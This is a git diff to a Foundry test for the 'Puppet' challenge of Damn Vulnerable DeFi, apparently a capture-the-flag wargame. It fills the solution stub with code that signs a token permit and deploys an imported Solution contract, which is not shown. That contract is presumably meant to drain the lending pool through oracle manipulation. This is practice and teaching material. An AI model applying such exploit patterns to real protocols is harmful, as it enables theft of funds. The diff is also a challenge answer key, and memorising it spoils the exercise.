@@ -7,6 +7,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
+import {Solution} from "./Solution.sol";
 
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -91,7 +92,29 @@ contract PuppetChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppet() public checkSolvedByPlayer {}
+    function test_puppet() public checkSolvedByPlayer {
+        uint256 deadline = vm.getBlockTimestamp() + 1;
+        bytes32 digest = keccak256(
+            bytes.concat(
+                "\x19\x01",
+                token.DOMAIN_SEPARATOR(),
+                keccak256(
+                    abi.encode(
+                        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
+                        player,
+                        vm.computeCreateAddress(player, vm.getNonce(player)),
+                        PLAYER_INITIAL_TOKEN_BALANCE,
+                        token.nonces(player),
+                        deadline
+                    )
+                )
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
+        new Solution{value: PLAYER_INITIAL_ETH_BALANCE}(
+            token, lendingPool, uniswapV1Exchange, recovery, PLAYER_INITIAL_TOKEN_BALANCE, deadline, v, r, s
+        );
+    }
 
     // Utility function to calculate Uniswap prices
     function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
